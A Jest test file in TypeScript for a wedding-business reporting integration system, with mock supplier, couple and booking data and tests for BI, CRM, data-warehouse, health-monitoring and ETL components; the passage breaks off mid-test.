import {
  describe,
  test,
  expect,
  beforeEach,
  afterEach,
  jest,
} from '@jest/globals';
import { ReportingIntegrationOrchestrator } from '../ReportingIntegrationOrchestrator';
import { WeddingReportingIntegrationManager } from '../WeddingReportingIntegrationManager';
import {
  IntegrationHealthMonitor,
  HealthMonitorConfig,
} from '../IntegrationHealthMonitor';
import { ETLPipelineManager, ETLPipelineConfig } from '../ETLPipelineManager';
import { TableauIntegration } from '../BIPlatformConnectors/TableauIntegration';
import { PowerBIIntegration } from '../BIPlatformConnectors/PowerBIIntegration';
import { LookerIntegration } from '../BIPlatformConnectors/LookerIntegration';
import { HubSpotWeddingCRMIntegrator } from '../CRMConnectors/HubSpotWeddingCRMIntegrator';
import { SalesforceWeddingIntegrator } from '../CRMConnectors/SalesforceWeddingIntegrator';
import { PipedriveWeddingIntegrator } from '../CRMConnectors/PipedriveWeddingIntegrator';
import { SnowflakeWeddingDataWarehouse } from '../DataWarehouseConnectors/SnowflakeWeddingDataWarehouse';
import { BigQueryWeddingDataWarehouse } from '../DataWarehouseConnectors/BigQueryWeddingDataWarehouse';
import { RedshiftWeddingDataWarehouse } from '../DataWarehouseConnectors/RedshiftWeddingDataWarehouse';

// Mock wedding data for testing
export const mockWeddingData = {
  suppliers: [
    {
      supplier_id: 'supplier_001',
      business_name: 'Amazing Photography Co',
      supplier_type: 'Photography',
      location: 'Los Angeles, CA',
      rating: 4.8,
      years_in_business: 10,
      pricing_tier: 'Mid-range',
      phone: '(555) 123-4567',
      email: 'info@amazingphoto.com',
      website: 'https://amazingphoto.com',
      is_active: true,
      created_at: '2024-01-15T10:30:00Z',
      updated_at: '2024-01-15T10:30:00Z',
    },
    {
      supplier_id: 'supplier_002',
      business_name: 'Elegant Venues',
      supplier_type: 'Venue',
      location: 'San Francisco, CA',
      rating: 4.9,
      years_in_business: 15,
      pricing_tier: 'Luxury',
      phone: '(555) 987-6543',
      email: 'bookings@elegantvenues.com',
      website: 'https://elegantvenues.com',
      is_active: true,
      created_at: '2024-01-10T08:00:00Z',
      updated_at: '2024-01-10T08:00:00Z',
    },
  ],
  couples: [
    {
      couple_id: 'couple_001',
      partner1_name: 'Sarah Johnson',
      partner2_name: 'Mike Chen',
      wedding_date: '2024-08-15',
      wedding_location: 'Napa Valley, CA',
      guest_count: 120,
      budget_total: 75000.0,
      wedding_style: 'Rustic Elegant',
      email_primary: 'sarah.johnson@email.com',
      phone_primary: '(555) 111-2222',
      is_active: true,
      created_at: '2024-01-05T14:20:00Z',
      updated_at: '2024-01-05T14:20:00Z',
    },
  ],
  bookings: [
    {
      booking_id: 'booking_001',
      couple_id: 'couple_001',
      supplier_id: 'supplier_001',
      booking_date: '2024-01-20T09:30:00Z',
      service_date: '2024-08-15',
      booking_status: 'confirmed',
      contract_value: 3500.0,
      deposit_amount: 1000.0,
      commission_rate: 0.1,
      commission_amount: 350.0,
      lead_source: 'Google Search',
      booking_channel: 'Website',
      notes: 'Full day wedding photography package',
      created_at: '2024-01-20T09:30:00Z',
      updated_at: '2024-01-20T09:30:00Z',
    },
  ],
  revenue: [
    {
      revenue_id: 'revenue_001',
      booking_id: 'booking_001',
      supplier_id: 'supplier_001',
      revenue_date: '2024-01-20',
      revenue_type: 'commission',
      gross_amount: 350.0,
      net_amount: 315.0,
      tax_amount: 35.0,
      currency: 'USD',
      payment_method: 'credit_card',
      transaction_id: 'txn_abc123xyz',
      created_at: '2024-01-20T10:00:00Z',
    },
  ],
  customerSatisfaction: [
    {
      satisfaction_id: 'satisfaction_001',
      booking_id: 'booking_001',
      couple_id: 'couple_001',
      supplier_id: 'supplier_001',
      survey_date: '2024-08-20T12:00:00Z',
      overall_rating: 5,
      communication_rating: 5,
      quality_rating: 5,
      value_rating: 4,
      timeliness_rating: 5,
      would_recommend: true,
      feedback_text:
        'Absolutely amazing photographer! Captured our special day perfectly.',
      sentiment_score: 0.95,
      created_at: '2024-08-20T12:00:00Z',
    },
  ],
};

// Test configurations
export const testHealthMonitorConfig: HealthMonitorConfig = {
  checkIntervalMs: 30000,
  alertThresholds: {
    criticalResponseTime: 5000,
    warningResponseTime: 2000,
    maxConsecutiveFailures: 3,
    dataQualityThreshold: 90,
  },
  notifications: {
    enabled: false, // Disable notifications in tests
    email: { enabled: false, recipients: [] },
    slack: { enabled: false },
    sms: { enabled: false, phoneNumbers: [] },
  },
  recovery: {
    autoRecoveryEnabled: true,
    maxRecoveryAttempts: 3,
    backoffMultiplier: 2,
    initialBackoffMs: 1000,
  },
};

export const testETLConfig: ETLPipelineConfig = {
  defaultBatchSize: 100,
  maxConcurrentPipelines: 2,
  retryAttempts: 3,
  retryDelayMs: 1000,
  timeoutMs: 30000,
  dataValidationEnabled: true,
  preserveDataLineage: true,
  enableParallelProcessing: false,
};

// Mock implementations for testing
export class MockTableauIntegration {
  private isConnected = false;

  async connect() {
    this.isConnected = true;
  }
  async disconnect() {
    this.isConnected = false;
  }

  async getHealthStatus() {
    return {
      isHealthy: this.isConnected,
      lastChecked: new Date(),
      responseTimeMs: 150,
      details: { connection: 'Connected', projects: 5 },
    };
  }

  async syncData() {
    return true;
  }
  async createDashboard() {
    return { dashboardId: 'test_dashboard' };
  }
  async generateReport() {
    return mockWeddingData.suppliers;
  }
}

export class MockHubSpotIntegration {
  private isConnected = false;

  async connect() {
    this.isConnected = true;
  }
  async disconnect() {
    this.isConnected = false;
  }

  async getHealthStatus() {
    return {
      isHealthy: this.isConnected,
      lastChecked: new Date(),
      responseTimeMs: 200,
      details: { connection: 'Connected', contacts: 1500 },
    };
  }

  async syncData() {
    return true;
  }
  async createContact() {
    return { contactId: 'hubspot_contact_123' };
  }
}

export class MockSnowflakeIntegration {
  private isConnected = false;

  async connect() {
    this.isConnected = true;
  }
  async disconnect() {
    this.isConnected = false;
  }

  async getHealthStatus() {
    return {
      isHealthy: this.isConnected,
      lastChecked: new Date(),
      responseTimeMs: 300,
      details: {
        connection: 'Connected',
        warehouse: 'WEDDING_WH',
        tablesCount: 15,
        dataQuality: { totalIssues: 2 },
      },
    };
  }

  async syncData() {
    return true;
  }
  async executeQuery() {
    return mockWeddingData.bookings;
  }
}

/**
 * Integration Orchestration Tests
 * Tests the main orchestration layer and wedding-specific integration management
 */
describe('Integration Orchestration System', () => {
  let orchestrator: ReportingIntegrationOrchestrator;
  let weddingManager: WeddingReportingIntegrationManager;

  beforeEach(() => {
    orchestrator = new ReportingIntegrationOrchestrator({
      maxConcurrentRequests: 5,
      requestTimeoutMs: 30000,
      retryAttempts: 3,
      enableHealthMonitoring: true,
      dataValidationEnabled: true,
    });

    weddingManager = new WeddingReportingIntegrationManager({
      defaultSyncIntervalMs: 300000,
      enableDataValidation: true,
      enableWeddingSpecificRules: true,
      maxRetries: 3,
    });
  });

  afterEach(async () => {
    // Cleanup
    await orchestrator.disconnect?.();
  });

  describe('Orchestrator Core Functionality', () => {
    test('should initialize orchestrator successfully', () => {
      expect(orchestrator).toBeDefined();
      expect(orchestrator.isConnected()).toBe(false);
    });

    test('should register integration connectors', async () => {
      const mockConnector = new MockTableauIntegration();

      await orchestrator.registerConnector(
        'tableau_test',
        mockConnector as any,
      );
      const connectors = orchestrator.getRegisteredConnectors();

      expect(connectors).toHaveLength(1);
      expect(connectors[0].id).toBe('tableau_test');
    });

    test('should handle multiple connector registrations', async () => {
      const tableauMock = new MockTableauIntegration();
      const hubspotMock = new MockHubSpotIntegration();
      const snowflakeMock = new MockSnowflakeIntegration();

      await orchestrator.registerConnector('tableau', tableauMock as any);
      await orchestrator.registerConnector('hubspot', hubspotMock as any);
      await orchestrator.registerConnector('snowflake', snowflakeMock as any);

      const connectors = orchestrator.getRegisteredConnectors();
      expect(connectors).toHaveLength(3);

      const connectorIds = connectors.map((c) => c.id);
      expect(connectorIds).toContain('tableau');
      expect(connectorIds).toContain('hubspot');
      expect(connectorIds).toContain('snowflake');
    });

    test('should perform data synchronization across connectors', async () => {
      const mockConnector = new MockTableauIntegration();
      await mockConnector.connect();
      await orchestrator.registerConnector('tableau', mockConnector as any);

      const syncRequest = {
        sourceSystem: 'wedsync',
        targetTable: 'suppliers',
        data: mockWeddingData.suppliers,
        syncMode: 'append' as const,
      };

      const result = await orchestrator.synchronizeData('tableau', syncRequest);
      expect(result).toBe(true);
    });

    test('should handle connector failures gracefully', async () => {
      const mockConnector = {
        connect: jest.fn().mockRejectedValue(new Error('Connection failed')),
        getHealthStatus: jest
          .fn()
          .mockRejectedValue(new Error('Health check failed')),
        syncData: jest.fn().mockRejectedValue(new Error('Sync failed')),
      };

      await orchestrator.registerConnector(
        'failing_connector',
        mockConnector as any,
      );

      const syncRequest = {
        sourceSystem: 'wedsync',
        targetTable: 'suppliers',
        data: mockWeddingData.suppliers,
        syncMode: 'append' as const,
      };

      const result = await orchestrator.synchronizeData(
        'failing_connector',
        syncRequest,
      );
      expect(result).toBe(false);
    });
  });

  describe('Wedding-Specific Integration Management', () => {
    test('should apply wedding business rules to supplier data', async () => {
      const result = await weddingManager.processWeddingSupplierData(
        mockWeddingData.suppliers,
      );

      expect(result).toHaveLength(2);
      expect(result[0].supplier_type).toBe('Photography');
      expect(result[1].supplier_type).toBe('Venue');

      // Check if wedding-specific enrichments were applied
      result.forEach((supplier) => {
        expect(supplier.created_at).toBeDefined();
        expect(supplier.updated_at).toBeDefined();
      });
    });

    test('should validate wedding booking data', async () => {
      const validationResult = await weddingManager.validateWeddingBookings(
        mockWeddingData.bookings,
      );

      expect(validationResult.isValid).toBe(true);
      expect(validationResult.errors).toHaveLength(0);
      expect(validationResult.validatedRecords).toHaveLength(1);
    });

    test('should calculate wedding revenue metrics', async () => {
      const metricsResult = await weddingManager.calculateRevenueMetrics(
        mockWeddingData.bookings,
        mockWeddingData.revenue,
      );

      expect(metricsResult.totalRevenue).toBe(350.0);
      expect(metricsResult.averageCommissionRate).toBe(0.1);
      expect(metricsResult.totalBookings).toBe(1);
    });

    test('should handle seasonal wedding data adjustments', async () => {
      const peakSeasonBooking = {
        ...mockWeddingData.bookings[0],
        service_date: '2024-07-15', // Peak wedding season
      };

      const result = await weddingManager.processSeasonalData([
        peakSeasonBooking,
      ]);
      expect(result[0].is_peak_season).toBe(true);
      expect(result[0].wedding_season).toBe('Summer');
    });

    test('should detect and handle wedding date conflicts', async () => {
      const conflictingBookings = [
        { ...mockWeddingData.bookings[0], booking_id: 'booking_001' },
        { ...mockWeddingData.bookings[0], booking_id: 'booking_002' }, // Same date, same supplier
      ];

      const conflictResult =
        await weddingManager.detectWeddingDateConflicts(conflictingBookings);
      expect(conflictResult.hasConflicts).toBe(true);
      expect(conflictResult.conflicts).toHaveLength(1);
    });
  });
});

/**
 * BI Platform Connectors Tests
 * Tests for Tableau, PowerBI, and Looker integrations
 */
describe('BI Platform Connectors', () => {
  let tableauIntegration: MockTableauIntegration;
  let powerbiMock: any;
  let lookerMock: any;

  beforeEach(() => {
    tableauIntegration = new MockTableauIntegration();

    powerbiMock = {
      connect: jest.fn().mockResolvedValue(undefined),
      disconnect: jest.fn().mockResolvedValue(undefined),
      getHealthStatus: jest.fn().mockResolvedValue({
        isHealthy: true,
        lastChecked: new Date(),
        responseTimeMs: 180,
      }),
      syncData: jest.fn().mockResolvedValue(true),
      createDataset: jest.fn().mockResolvedValue({ datasetId: 'test_dataset' }),
    };

    lookerMock = {
      connect: jest.fn().mockResolvedValue(undefined),
      disconnect: jest.fn().mockResolvedValue(undefined),
      getHealthStatus: jest.fn().mockResolvedValue({
        isHealthy: true,
        lastChecked: new Date(),
        responseTimeMs: 220,
      }),
      syncData: jest.fn().mockResolvedValue(true),
      createLook: jest.fn().mockResolvedValue({ lookId: 'test_look' }),
    };
  });

  describe('Tableau Integration', () => {
    test('should connect to Tableau Server', async () => {
      await tableauIntegration.connect();
      const healthStatus = await tableauIntegration.getHealthStatus();

      expect(healthStatus.isHealthy).toBe(true);
      expect(healthStatus.responseTimeMs).toBeLessThan(1000);
    });

    test('should sync wedding supplier data to Tableau', async () => {
      await tableauIntegration.connect();
      const syncResult = await tableauIntegration.syncData();

      expect(syncResult).toBe(true);
    });

    test('should create wedding dashboard in Tableau', async () => {
      await tableauIntegration.connect();
      const dashboard = await tableauIntegration.createDashboard();

      expect(dashboard.dashboardId).toBe('test_dashboard');
    });

    test('should generate supplier performance report', async () => {
      await tableauIntegration.connect();
      const report = await tableauIntegration.generateReport();

      expect(report).toHaveLength(2);
      expect(report[0].supplier_type).toBe('Photography');
    });

    test('should handle Tableau connection failures', async () => {
      const failingTableau = {
        connect: jest
          .fn()
          .mockRejectedValue(new Error('Tableau Server unavailable')),
        getHealthStatus: jest.fn().mockResolvedValue({
          isHealthy: false,
          error: 'Connection failed',
        }),
      };

      const healthStatus = await failingTableau.getHealthStatus();
      expect(healthStatus.isHealthy).toBe(false);
      expect(healthStatus.error).toBe('Connection failed');
    });
  });

  describe('Power BI Integration', () => {
    test('should connect to Power BI service', async () => {
      await powerbiMock.connect();
      expect(powerbiMock.connect).toHaveBeenCalled();
    });

    test('should create Power BI dataset from wedding data', async () => {
      await powerbiMock.connect();
      const dataset = await powerbiMock.createDataset();

      expect(dataset.datasetId).toBe('test_dataset');
    });

    test('should maintain healthy connection status', async () => {
      const healthStatus = await powerbiMock.getHealthStatus();

      expect(healthStatus.isHealthy).toBe(true);
      expect(healthStatus.responseTimeMs).toBeLessThan(1000);
    });
  });

  describe('Looker Integration', () => {
    test('should connect to Looker instance', async () => {
      await lookerMock.connect();
      expect(lookerMock.connect).toHaveBeenCalled();
    });

    test('should create Looker look from wedding data', async () => {
      await lookerMock.connect();
      const look = await lookerMock.createLook();

      expect(look.lookId).toBe('test_look');
    });

    test('should sync data successfully', async () => {
      const syncResult = await lookerMock.syncData();
      expect(syncResult).toBe(true);
    });
  });
});

/**
 * CRM Integration Tests
 * Tests for HubSpot, Salesforce, and Pipedrive integrations
 */
describe('CRM Integrations', () => {
  let hubspotMock: MockHubSpotIntegration;
  let salesforceMock: any;
  let pipedriveMock: any;

  beforeEach(() => {
    hubspotMock = new MockHubSpotIntegration();

    salesforceMock = {
      connect: jest.fn().mockResolvedValue(undefined),
      disconnect: jest.fn().mockResolvedValue(undefined),
      getHealthStatus: jest.fn().mockResolvedValue({
        isHealthy: true,
        lastChecked: new Date(),
        responseTimeMs: 250,
      }),
      createWeddingOpportunity: jest
        .fn()
        .mockResolvedValue({ opportunityId: 'sf_opp_123' }),
      syncSupplierData: jest.fn().mockResolvedValue(true),
    };

    pipedriveMock = {
      connect: jest.fn().mockResolvedValue(undefined),
      disconnect: jest.fn().mockResolvedValue(undefined),
      getHealthStatus: jest.fn().mockResolvedValue({
        isHealthy: true,
        lastChecked: new Date(),
        responseTimeMs: 190,
      }),
      createDeal: jest.fn().mockResolvedValue({ dealId: 'pd_deal_456' }),
      syncContactData: jest.fn().mockResolvedValue(true),
    };
  });

  describe('HubSpot CRM Integration', () => {
    test('should connect to HubSpot API', async () => {
      await hubspotMock.connect();
      const healthStatus = await hubspotMock.getHealthStatus();

      expect(healthStatus.isHealthy).toBe(true);
      expect(healthStatus.details.contacts).toBe(1500);
    });

    test('should create wedding supplier contact', async () => {
      await hubspotMock.connect();
      const contact = await hubspotMock.createContact();

      expect(contact.contactId).toBe('hubspot_contact_123');
    });

    test('should sync supplier data to HubSpot', async () => {
      await hubspotMock.connect();
      const syncResult = await hubspotMock.syncData();

      expect(syncResult).toBe(true);
    });

    test('should handle API rate limiting gracefully', async () => {
      const rateLimitedHubSpot = {
        ...hubspotMock,
        syncData: jest
          .fn()
          .mockRejectedValueOnce(new Error('Rate limit exceeded'))
          .mockResolvedValueOnce(true), // Retry succeeds
      };

      // First call fails, second succeeds after retry
      await expect(rateLimitedHubSpot.syncData()).rejects.toThrow(
        'Rate limit exceeded',
      );
      const retryResult = await rateLimitedHubSpot.syncData();
      expect(retryResult).toBe(true);
    });
  });

  describe('Salesforce CRM Integration', () => {
    test('should create wedding opportunity in Salesforce', async () => {
      await salesforceMock.connect();
      const opportunity = await salesforceMock.createWeddingOpportunity();

      expect(opportunity.opportunityId).toBe('sf_opp_123');
    });

    test('should sync supplier data to Salesforce', async () => {
      const syncResult = await salesforceMock.syncSupplierData();
      expect(syncResult).toBe(true);
    });

    test('should maintain healthy connection', async () => {
      const healthStatus = await salesforceMock.getHealthStatus();
      expect(healthStatus.isHealthy).toBe(true);
    });
  });

  describe('Pipedrive CRM Integration', () => {
    test('should create wedding deal in Pipedrive', async () => {
      await pipedriveMock.connect();
      const deal = await pipedriveMock.createDeal();

      expect(deal.dealId).toBe('pd_deal_456');
    });

    test('should sync contact data successfully', async () => {
      const syncResult = await pipedriveMock.syncContactData();
      expect(syncResult).toBe(true);
    });
  });
});

/**
 * Data Warehouse Connectors Tests
 * Tests for Snowflake, BigQuery, and Redshift integrations
 */
describe('Data Warehouse Connectors', () => {
  let snowflakeMock: MockSnowflakeIntegration;
  let bigqueryMock: any;
  let redshiftMock: any;

  beforeEach(() => {
    snowflakeMock = new MockSnowflakeIntegration();

    bigqueryMock = {
      connect: jest.fn().mockResolvedValue(undefined),
      disconnect: jest.fn().mockResolvedValue(undefined),
      getHealthStatus: jest.fn().mockResolvedValue({
        isHealthy: true,
        lastChecked: new Date(),
        responseTimeMs: 180,
        details: { dataset: 'wedding_data', tables: 12 },
      }),
      syncData: jest.fn().mockResolvedValue(true),
      executeQuery: jest.fn().mockResolvedValue(mockWeddingData.suppliers),
    };

    redshiftMock = {
      connect: jest.fn().mockResolvedValue(undefined),
      disconnect: jest.fn().mockResolvedValue(undefined),
      getHealthStatus: jest.fn().mockResolvedValue({
        isHealthy: true,
        lastChecked: new Date(),
        responseTimeMs: 220,
        details: { cluster: 'wedding-cluster', nodeCount: 3 },
      }),
      syncData: jest.fn().mockResolvedValue(true),
      executeQuery: jest.fn().mockResolvedValue(mockWeddingData.bookings),
    };
  });

  describe('Snowflake Data Warehouse', () => {
    test('should connect to Snowflake warehouse', async () => {
      await snowflakeMock.connect();
      const healthStatus = await snowflakeMock.getHealthStatus();

      expect(healthStatus.isHealthy).toBe(true);
      expect(healthStatus.details.warehouse).toBe('WEDDING_WH');
    });

    test('should execute wedding data queries', async () => {
      await snowflakeMock.connect();
      const queryResult = await snowflakeMock.executeQuery();

      expect(queryResult).toHaveLength(1);
      expect(queryResult[0].booking_id).toBe('booking_001');
    });

    test('should sync wedding data successfully', async () => {
      await snowflakeMock.connect();
      const syncResult = await snowflakeMock.syncData();

      expect(syncResult).toBe(true);
    });

    test('should report data quality metrics', async () => {
      await snowflakeMock.connect();
      const healthStatus = await snowflakeMock.getHealthStatus();

      expect(healthStatus.details.dataQuality.totalIssues).toBe(2);
    });
  });

  describe('BigQuery Data Warehouse', () => {
    test('should connect to BigQuery dataset', async () => {
      await bigqueryMock.connect();
      const healthStatus = await bigqueryMock.getHealthStatus();

      expect(healthStatus.isHealthy).toBe(true);
      expect(healthStatus.details.dataset).toBe('wedding_data');
    });

    test('should execute complex wedding analytics queries', async () => {
      const queryResult = await bigqueryMock.executeQuery();

      expect(queryResult).toHaveLength(2);
      expect(queryResult[0].supplier_type).toBe('Photography');
    });
  });

  describe('Redshift Data Warehouse', () => {
    test('should connect to Redshift cluster', async () => {
      await redshiftMock.connect();
      const healthStatus = await redshiftMock.getHealthStatus();

      expect(healthStatus.isHealthy).toBe(true);
      expect(healthStatus.details.cluster).toBe('wedding-cluster');
    });

    test('should handle large wedding data volumes', async () => {
      const syncResult = await redshiftMock.syncData();
      expect(syncResult).toBe(true);
    });
  });
});

/**
 * Health Monitoring System Tests
 * Tests for integration health monitoring and alerting
 */
describe('Integration Health Monitoring', () => {
  let healthMonitor: IntegrationHealthMonitor;
  let mockIntegrations: any[];

  beforeEach(() => {
    healthMonitor = new IntegrationHealthMonitor(testHealthMonitorConfig);

    mockIntegrations = [
      {
        id: 'tableau_test',
        name: 'Tableau Test',
        type: 'bi_platform',
        priority: 'high',
        connector: new MockTableauIntegration(),
        isEnabled: true,
      },
      {
        id: 'hubspot_test',
        name: 'HubSpot Test',
        type: 'crm',
        priority: 'critical',
        connector: new MockHubSpotIntegration(),
        isEnabled: true,
      },
      {
        id: 'snowflake_test',
        name: 'Snowflake Test',
        type: 'data_warehouse',
        priority: 'critical',
        connector: new MockSnowflakeIntegration(),
        isEnabled: true,
      },
    ];
  });

  afterEach(async () => {
    await healthMonitor.stopMonitoring();
  });

  describe('Health Monitor Core Functions', () => {
    test('should register integrations for monitoring', async () => {
      for (const integration of mockIntegrations) {
        healthMonitor.registerIntegration(integration);
      }

      const statuses = healthMonitor.getAllIntegrationStatuses();
      expect(statuses).toHaveLength(3);
    });

    test('should perform health checks on all integrations', async () => {
      for (const integration of mockIntegrations) {
        await integration.connector.connect();
        healthMonitor.registerIntegration(integration);
      }

      await healthMonitor.performHealthChecks();

      // Check that health checks were performed
      const statuses = healthMonitor.getAllIntegrationStatuses();
      statuses.forEach((status) => {
        expect(status.lastHealthCheck).toBeDefined();
      });
    });

    test('should detect unhealthy integrations', async () => {
      // Create a failing integration
      const failingIntegration = {
        id: 'failing_test',
        name: 'Failing Test',
        type: 'bi_platform',
        priority: 'medium',
        connector: {
          getHealthStatus: jest.fn().mockResolvedValue({
            isHealthy: false,
            error: 'Connection timeout',
          }),
        },
        isEnabled: true,
      };

      healthMonitor.registerIntegration(failingIntegration as any);
      await healthMonitor.performHealthCheck('failing_test');

      const alerts = healthMonitor.getUnresolvedAlerts();
      expect(alerts.length).toBeGreaterThan(0);

      const alert = alerts.find((a) => a.integrationId === 'failing_test');
      expect(alert).toBeDefined();
      expect(alert?.alertType).toBe('warning');
    });

    test('should trigger recovery for failed integrations', async () => {
      const recoverableIntegration = {
        id: 'recoverable_test',
        name: 'Recoverable Test',
        type: 'crm',
        priority: 'high',
        connector: {
          getHealthStatus: jest
            .fn()
            .mockResolvedValueOnce({
              isHealthy: false,
              error: 'Temporary failure',
            })
            .mockResolvedValueOnce({ isHealthy: true, responseTimeMs: 150 }),
          disconnect: jest.fn().mockResolvedValue(undefined),
          connect: jest.fn().mockResolvedValue(undefined),
        },
        isEnabled: true,
      };

      healthMonitor.registerIntegration(recoverableIntegration as any);

      // Force consecutive failures to trigger recovery
      const integration =
        healthMonitor.getIntegrationStatus('recoverable_test');
      if (integration) {
        integration.consecutiveFailures = 3;
      }

      const recoveryResult = await healthMonitor.attemptRecovery(
        'recoverable_test',
        'manual',
      );
      expect(recoveryResult).toBe(true);
    });

    test('should handle wedding day enhanced monitoring', async () => {
      // Mock Saturday (wedding day)
      const originalGetDay = Date.prototype.getDay;
      Date.prototype.getDay = jest.fn().mockReturnValue(6); // Saturday

      for (const integration of mockIntegrations) {
        await integration.connector.connect();
        healthMonitor.registerIntegration(integration);
      }

      // Trigger wedding day monitoring check
      await (healthMonitor as any).checkWeddingDayCriticalPeriods();

      // Verify enhanced monitoring occurred
      const criticalIntegrations = mockIntegrations.filter(
        (i) => i.priority === 'critical',
      );
      expect(criticalIntegrations.length).toBe(2); // hubspot and snowflake

      // Restore original method
      Date.prototype.getDay = originalGetDay;
    });

    test('should generate system overview metrics', async () => {
      for (const integration of mockIntegrations) {
        await integration.connector.connect();
        healthMonitor.registerIntegration(integration);
      }

      const overview = healthMonitor.getSystemOverview();

      expect(overview.totalIntegrations).toBe(3);
      expect(overview.healthyIntegrations).toBeLessThanOrEqual(3);
      expect(overview.runningExecutions).toBe(0);
    });
  });

  describe('Alert Management', () => {
    test('should acknowledge alerts', async () => {
      // Create an alert first
      const failingIntegration = {
        id: 'alert_test',
        name: 'Alert Test',
        type: 'bi_platform',
        priority: 'medium',
        connector: {
          getHealthStatus: jest.fn().mockResolvedValue({
            isHealthy: false,
            error: 'Test error',
          }),
        },
        isEnabled: true,
      };

      healthMonitor.registerIntegration(failingIntegration as any);
      await healthMonitor.performHealthCheck('alert_test');

      const alerts = healthMonitor.getUnresolvedAlerts();
      expect(alerts.length).toBeGreaterThan(0);

      const alertId = alerts[0].id;
      const acknowledged = await healthMonitor.acknowledgeAlert(
        alertId,
        'test_user',
        'Test acknowledgment',
      );

      expect(acknowledged).toBe(true);

      const updatedAlerts = healthMonitor.getUnresolvedAlerts();
      const acknowledgedAlert = updatedAlerts.find((a) => a.id === alertId);
      expect(acknowledgedAlert?.acknowledgements).toHaveLength(1);
    });

    test('should resolve alerts', async () => {
      // Create and then resolve an alert
      const testIntegration = {
        id: 'resolve_test',
        name: 'Resolve Test',
        type: 'crm',
        priority: 'low',
        connector: {
          getHealthStatus: jest.fn().mockResolvedValue({
            isHealthy: false,
            error: 'Test error',
          }),
        },
        isEnabled: true,
      };

      healthMonitor.registerIntegration(testIntegration as any);
      await healthMonitor.performHealthCheck('resolve_test');

      const alerts = healthMonitor.getUnresolvedAlerts();
      const alertId = alerts[0].id;

      const resolved = await healthMonitor.resolveAlert(alertId, 'test_user');
      expect(resolved).toBe(true);

      const unresolvedAlerts = healthMonitor.getUnresolvedAlerts();
      const resolvedAlert = unresolvedAlerts.find((a) => a.id === alertId);
      expect(resolvedAlert).toBeUndefined();
    });
  });
});

/**
 * ETL Pipeline Manager Tests
 * Tests for data transformation and pipeline orchestration
 */
describe('ETL Pipeline Manager', () => {
  let etlManager: ETLPipelineManager;

  beforeEach(() => {
    etlManager = new ETLPipelineManager(testETLConfig);
  });

  describe('Pipeline Management', () => {
    test('should register ETL pipeline successfully', async () => {
      const testPipeline = {
        id: 'test_pipeline_001',
        name: 'Wedding Supplier Data Pipeline',
        description: 'Processes wedding supplier data for analytics',
        source: {
          type: 'api' as const,
          connectionId: 'wedsync_api',
          config: {
            endpoint: 'https://api.wedsync.com/suppliers',
          },
          extractionRules: {},
        },
        transformations: [
          {
            id: 'transform_001',
            name: 'Standardize Supplier Types',
            type: 'mapping' as const,
            order: 1,
            config: {
              mappingRules: {
                supplier_type: 'standardizeSupplierType',
              },
            },
            weddingBusinessRules: {
              standardizeSupplierTypes: true,
            },
          },
        ],
        destinations: [
          {
            type: 'database' as const,
            connectionId: 'snowflake_wedding_dw',
            config: {
              table: 'dim_suppliers',
              syncMode: 'upsert' as const,
            },
          },
        ],
        enabled: true,
        priority: 'high' as const,
        weddingSpecific: {
          dataType: 'suppliers' as const,
          seasonalAdjustments: false,
          weddingDateAware: false,
          supplierTypeSpecific: true,
        },
        errorHandling: {
          onSourceError: 'retry' as const,
          onTransformationError: 'log_and_continue' as const,
          onDestinationError: 'retry' as const,
          maxErrors: 10,
          notificationThreshold: 5,
          quarantineInvalidData: true,
        },
        monitoring: {
          trackDataLineage: true,
          collectMetrics: true,
          logLevel: 'info' as const,
          alertOnFailure: true,
          alertOnSlowExecution: true,
          alertThresholds: {
            executionTimeMs: 300000,
            errorRate: 0.05,
            dataQualityScore: 85,
          },
        },
      };

      await etlManager.registerPipeline(testPipeline);

      const pipelines = etlManager.getPipelines();
      expect(pipelines).toHaveLength(1);
      expect(pipelines[0].id).toBe('test_pipeline_001');
    });

    test('should validate pipeline configuration', async () => {
      const invalidPipeline = {
        id: 'invalid_pipeline',
        name: 'Invalid Pipeline',
        // Missing required fields
      };

      await expect(
        etlManager.registerPipeline(invalidPipeline as any),
      ).rejects.toThrow('Pipeline must have a source configuration');
    });

    test('should execute pipeline with mock data', async () => {
      const mockPipeline = {
        id: 'mock_pipeline',
        name: 'Mock Wedding Data Pipeline',
        description: 'Processes mock wedding data',
        source: {
          type: 'manual' as const,
          connectionId: 'mock_source',
          config: {},
          extractionRules: {},
        },
        transformations: [
          {
            id: 'mock_transform',
            name: 'Mock Transformation',
            type: 'mapping' as const,
            order: 1,
            config: {
              mappingRules: {
                supplier_id: 'supplier_id',
                business_name: 'business_name',
              },
            },
          },
        ],
        destinations: [
          {
            type: 'file' as const,
            connectionId: 'mock_dest',
            config: {
              filePath: '/tmp/mock_output.json',
              syncMode: 'replace' as const,
            },
          },
        ],
        enabled: true,
        priority: 'medium' as const,
        weddingSpecific: {
          dataType: 'suppliers' as const,
          seasonalAdjustments: false,
          weddingDateAware: false,
          supplierTypeSpecific: false,
        },
        errorHandling: {
          onSourceError: 'fail' as const,
          onTransformationError: 'fail' as const,
          onDestinationError: 'fail' as const,
          maxErrors: 0,
          notificationThreshold: 0,
          quarantineInvalidData: false,
        },
        monitoring: {
          trackDataLineage: false,
          collectMetrics: true,
          logLevel: 'error' as const,
          alertOnFailure: false,
          alertOnSlowExecution: false,
          alertThresholds: {
            executionTimeMs: 60000,
            errorRate: 0.1,
            dataQualityScore: 70,
          },
        },
      };

      await etlManager.registerPipeline(mockPipeline);

      // Mock the extraction to return our test data
      (etlManager as any).extractFromManual = jest
        .fn()
        .mockResolvedValue(mockWeddingData.suppliers);

      const execution = await etlManager.executePipeline('mock_pipeline', true);

      expect(execution.status).toBe('completed');
      expect(execution.recordsProcessed).toBe(2);
      expect(execution.recordsSuccessful).toBe(2);
      expect(execution.recordsFailed).toBe(0);
    });

    test('should apply wedding-specific business rules', async () => {
      const weddingData = [
        {
          supplier_id: 'supplier_test',
          business_name: 'Test Photography',
          supplier_type: 'photographer', // Lowercase, should be standardized
          rating: 4.7,
          wedding_date: '2024-06-15', // Should be detected as peak season
        },
      ];

      const transformationRules = {
        validateWeddingDates: true,
        standardizeSupplierTypes: true,
        enrichWithSeasonalData: true,
        normalizeRatings: true,
      };

      const processedData = (etlManager as any).applyWeddingBusinessRules(
        weddingData[0],
        transformationRules,
      );

      expect(processedData.supplier_type).toBe('Photography');
      expect(processedData.rating).toBe(4.5); // Rounded to nearest 0.5
    });

    test('should handle pipeline execution errors gracefully', async () => {
      const errorPipeline = {
        id: 'error_pipeline',
        name: 'Error Pipeline',
        description: 'Pipeline that fails',
        source: {
          type: 'api' as const,
          connectionId: 'failing_api',
          config: {
